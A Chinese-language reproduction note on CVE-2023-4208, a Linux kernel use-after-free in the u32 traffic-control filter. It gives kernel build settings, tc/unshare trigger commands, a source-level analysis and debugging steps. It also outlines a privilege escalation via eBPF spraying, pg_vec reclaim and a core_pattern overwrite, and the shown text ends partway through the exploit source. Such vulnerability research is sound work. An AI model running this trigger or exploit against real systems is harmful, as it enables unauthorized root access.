---
title: CVE-2023-4208复现笔记
url: https://mp.weixin.qq.com/s?__biz=MjM5NTc2MDYxMw==&mid=2458572213&idx=1&sn=6f216d0dd151bf49db7607367a01d861&chksm=b18de53f86fa6c299538c10a4071807acb9e4a2b5aa5a3a383eb5d1d1db0f3ce49f89337041a&scene=58&subscene=0#rd
source: 看雪学苑
date: 2024-09-08
fetch_date: 2025-10-06T18:24:37.217028
---

# CVE-2023-4208复现笔记

![cover_image](https://mmbiz.qpic.cn/sz_mmbiz_jpg/1UG7KPNHN8HVKwxs8YuPCj9dz23osicjIrfOP0nR9AvHicdOH0E7jkjII1yO58YdvmhjkP41STQHF44aaO36KQXw/0?wx_fmt=jpeg)

# CVE-2023-4208复现笔记

mb\_btcapvow

看雪学苑

```
一

环境搭建
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8HVKwxs8YuPCj9dz23osicjIoNYLDOOjjNKEgoVQLdLMPBwounmTbpGeralJlfT6Ep3QoP67CjuFjg/640?wx_fmt=png&from=appmsg)

commit：2c85ebc57b3e1817b6ce1a6b703928e113a90442

内核源码下载：

```
https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/refs/tags
```

```
make memuconfig
```

```
make defconfig
```

编辑 .config:

```
# 为支持image需要开启
CONFIG_CONFIGFS_FS=y
CONFIG_SECURITYFS=y
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8HVKwxs8YuPCj9dz23osicjI1xFuf8xSKSEHT98lJJ75CFGMDuqS7n1G5ERdtpzhIyaxXdj9Uzia1rA/640?wx_fmt=png&from=appmsg)

```
sudo make -j$(nproc) bzImage
```

遇到问题：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8HVKwxs8YuPCj9dz23osicjIdSXTDytMgpS5gAk54TBJM8nTVXX4mM6Uh4iad9LjLIEicrZOBlHYv6iag/640?wx_fmt=png&from=appmsg)

objtool: Don't fail on missing symbol table · Pull Request !141 · openEuler/kernel（https://gitee.com/openeuler/kernel/pulls/141/files）

![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8HVKwxs8YuPCj9dz23osicjIoaznItiacWU5QibyHgUWXGmv3KjsO9nicfnhWbz2kmduqsCSEfic2MjPxA/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8HVKwxs8YuPCj9dz23osicjIAGlFx6SfE7lzDNYTicwGYrJe5aRlUNbTVf6cTeGoTCWpng7GnpMCwuA/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8HVKwxs8YuPCj9dz23osicjISZP89OuNqThZCpbrh9ib7UZfh8XoCXGOzhNONicSLYJTHlOHEgYj3EeQ/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8HVKwxs8YuPCj9dz23osicjIEdr2dMB0nlTwgXQA4WKgQOOHpZ3jJ62PvNJSjT0QDyusEXXdod6erw/640?wx_fmt=png&from=appmsg)

#

```
二

漏洞介绍
```

◆Kernel configuration: CONFIG\_NET\_SCHED=y, CONFIG\_NET\_CLS\_U32=y

所以总的config就是：

defconfig+menuconfig

```
CONFIG_CONFIGFS_FS=y
CONFIG_SECURITYFS=y
CONFIG_NET_SCHED=y
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8HVKwxs8YuPCj9dz23osicjIyg3KIqHuuhwu7aKlxmC5lMAdGB9J5C3NYO3l2cuepIIzsdb6E2QS6w/640?wx_fmt=png&from=appmsg)

```
CONFIG_CONFIGFS_FS=y  #支持img
CONFIG_SECURITYFS=y   #支持img
CONFIG_DEBUG_INFO=y  #调试
CONFIG_USER_NS=y   #支持新的namespace
CONFIG_USERFAULTFD=y #支持userfaultfd
CONFIG_NET_SCHED=y  #漏洞触发必要选项
CONFIG_NET_CLS_U32=y #漏洞触发必要选项

CONFIG_NETFILTER_XT_TARGET_MARK=y
CONFIG_NET_SCH_DRR=y   #使用drr

CONFIG_BPF=y	#漏洞利用所必须
CONFIG_BPF_JIT=y #漏洞利用所必须
CONFIG_HAVE_EBPF_JIT=y #漏洞利用所必须

CONFIG_PREEMPT=y
```

#

#

```
三

POC
```

在复现本CVE时，笔者已经有了CVE-2023-4207的复现经历，所以这里参照与之相同的思路进行复现，不过相关细节可能不再赘述，有不清楚的地方可以参照笔者的这一篇文章：[原创]CVE-2023-4207复现笔记（https://bbs.kanxue.com/thread-283073.htm）

以下是一些触发漏洞的命令行：

```
unshare --mount --uts --ipc --net --pid --fork --map-root-user --user --mount-proc /bin/sh

/bin/iptables-legacy -t mangle -A POSTROUTING -d 127.0.0.1/24 -j MARK --set-mark 1

ip link set dev lo up

/bin/tc qdisc add dev lo root handle 1: drr

/bin/tc class add dev lo parent 1: classid 1:10 drr quantum 60

/bin/tc filter add dev lo protocol ip prio 1 u32 match mark 1 0xff classid 1:10

/bin/tc filter change dev lo protocol ip prio 1 handle 800::800 u32 indev lo classid 1:2

/bin/tc class delete dev lo classid 1:10
```

#

#

```
四

漏洞分析
```

相关源码路径如下：

```
https://elixir.bootlin.com/linux/v5.10/source/net/sched/cls_u32.c#L841
```

在添加filter和替换filter的时候都会调用到这个函数；

这里的n应该就是旧的filter：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8HVKwxs8YuPCj9dz23osicjInGXYv8AKcXolXzS5fJDXluIEVEK9RF9mGRSVLfTVzdBE1dsQv2fapQ/640?wx_fmt=png&from=appmsg)

这里通过u32\_init\_knote分配新的过滤器：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8HVKwxs8YuPCj9dz23osicjIPL0TkhkMXGUBoetysN0cBUl4YhBxj3q6XohTLfSNOxnvuGvV4XHadg/640?wx_fmt=png&from=appmsg)

可以看到在该函数中直接将旧的过滤器的res分配给新的过滤器：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8HVKwxs8YuPCj9dz23osicjIAP82TLThqENKaW0kDQR5FtZO5CaSKKicPwleuU9XApc6NyU6ibCczT2Q/640?wx_fmt=png&from=appmsg)

然后tcf\_unbind\_filter旧的过滤器：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8HVKwxs8YuPCj9dz23osicjIUohMrt2CEqUp1MSa1moXgRRK2vgohLD1nd98mIBNe4n8seUviaGoQYw/640?wx_fmt=png&from=appmsg)

具体函数如下：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8HVKwxs8YuPCj9dz23osicjI8qw3DpJAwfMneCLiaziazdzYKEyBUcdU7LUdFhPIKONibDJEAd5W8YAyg/640?wx_fmt=png&from=appmsg)

继续跟进到\_\_tcf\_unbind\_filter:

![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8HVKwxs8YuPCj9dz23osicjI5Shhv1bkUt6Vic9SfHibpKqIqqEfBRyj7iawk52XnKpHibax24zE6QEEIA/640?wx_fmt=png&from=appmsg)

这里调用了函数指针，通过调试后可以得知是这个函数（其实用的是drr，基本就是这个函数）：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8HVKwxs8YuPCj9dz23osicjIqqdiaE2DChhHjImjic7T4Jw7lFRcLCvPgxWa631AJQol2yTsic6J6Or6Q/640?wx_fmt=png&from=appmsg)

下面看该函数的具体定义：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8HVKwxs8YuPCj9dz23osicjIT8lEgXrWk29Mko4HtS3QxyGYPgRPibD7PxELEHzLAPWhvQeyfJHX1uw/640?wx_fmt=png&from=appmsg)

在这里将drr\_class的filter\_cnt减一；然而实际上，我们的class只是换了一个filter而已，其引用数不应该被减少；

剩下的就和CVE-2023-4207一样了，我们删除drr\_class的时候会调用drr\_delete\_class函数：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8HVKwxs8YuPCj9dz23osicjIWicEk62r36NF9I7z2BQWWCV8NEykHL5G1XCTRVt9unibzKB0wuT2RGLQ/640?wx_fmt=png&from=appmsg)

如果引用计数<=0，就可以调用到drr\_destroy\_class：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8HVKwxs8YuPCj9dz23osicjIK3MicAqooOXQWJlM13ibpSOBDECzBib5cxo25zsjfNTPB375P8u7JTGKw/640?wx_fmt=png&from=appmsg)

这样就错误地释放了对应的qdisc和drr\_class；

下面还是贴一张笔者分析的图：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8HVKwxs8YuPCj9dz23osicjIE2t2QmFwXed5wDYhX7fzVvU6lxlQC5Q0UZaGcxI5c1zJPicSuXLwnFw/640?wx_fmt=png&from=appmsg)

```
五

调试
```

```
gdb -ex "target remote localhost:1234" -ex "file /mnt/hgfs/VMshare2/cve/all/CVE-2023-4208/vmlinux" -ex "c"
```

主要是在drr\_destroy\_class下断点，然后查看cl，在后续喷射完pg\_vec（当然也可以使用其他结构体）之后，可依据需使用该命令查看是否覆盖成功：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8HVKwxs8YuPCj9dz23osicjIAiaibclwGMT3VmcnrdS53giafvBpFCwMt2mItCfrES3Jdb3KoxpibygY5A/640?wx_fmt=png&from=appmsg)

```
六

攻击思路
```

后边的攻击思路和CVE-2023-4207就一样了，提前喷射eBPF，是的在内核加载模块地址内部署好我们的代码片段，然后构造uaf，之后使用pg\_vec喷射出来已经释放但是仍然被使用的drr\_class，此时它的偏移0x60处的qdisc成员被填入了pg\_vec申请的虚拟地址，虽然我们不知道这个地址，然后通过mmap可以映射这个地址，我们就有了写这个地址的权限，写其前8个字节为我们的目标地址，也就是我们喷射的eBPF地址，即可劫持控制流；然后实现地址泄露+覆盖core\_pattern，最后在另一个进程触发crash，使得root1得到执行，提权成功！

```
七

攻击成功
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8HVKwxs8YuPCj9dz23osicjIW1PluwYgAJZCOfAOSRsYjNN2HSdLdr2nGyBLMqTdzZqX79paSUqVhw/640?wx_fmt=png&from=appmsg)

#

```
八

EXP
```

poc.c:

```
#define _GNU_SOURCE
#include <sched.h>
#include <unistd.h>
#include <stdlib.h>
#include <stdio.h>
#include <asm/types.h>
#include <sys/socket.h>
#include <linux/netlink.h>
#include <sys/ipc.h>
#include <sys/timerfd.h>
#include <sys/msg.h>
#include <fcntl.h>
#include <err.h>
#include <sys/syscall.h>
#include <linux/aio_abi.h>
#include <sys/mman.h>
#include <sys/prctl.h>
#include <sys/resource.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <string.h>
#include <pthread.h>
#include <signal.h>
#include <linux/filter.h>
#include <linux/seccomp.h>
#include <sys/sendfile.h>
#define SYSCHK(x) ({              \
    typeof(x) __res = (x);        \
    if (__res == (typeof(x))-1)   \
        err(1, "SYSCHK(" #x ")"); \
    __res;                        \
})

#define PAUSE           \
    {                   \
        printf(":");    \
        int x;          \
        read(0, &x, 1); \
    }
extern void write_to_cpu_entry_area(void *buf);
void handle(int s) {}
void set_cpu(int i)
{
    cpu_set_t mask;
    CPU_ZERO(&mask);
    CPU_SET(i, &mask);
    sched_setaffinity(0, sizeof(mask), &mask);
}

int cfd[2];
int sfd[0x200][2];
char payload[0x1000];
char buf[0x1000];
struct sock_filter filter[0x1000];
int stopfd[2];
const int DRR_CLASS_SPRAY_THREADS = 0x100;
void *job(void *x)
{
    size_t idx = (size_t)x;
    write(cfd[1], buf, 1);
    read(cfd[0], buf, 1);
    set_cpu(0);
    struct iovec iov = {buf, 0x1000};
    struct msghdr mhdr = {
        .msg_iov = &iov,
        .msg_iovlen = 1,
        .msg_control = payload,
        .msg_controllen = 0x80};
    sendm...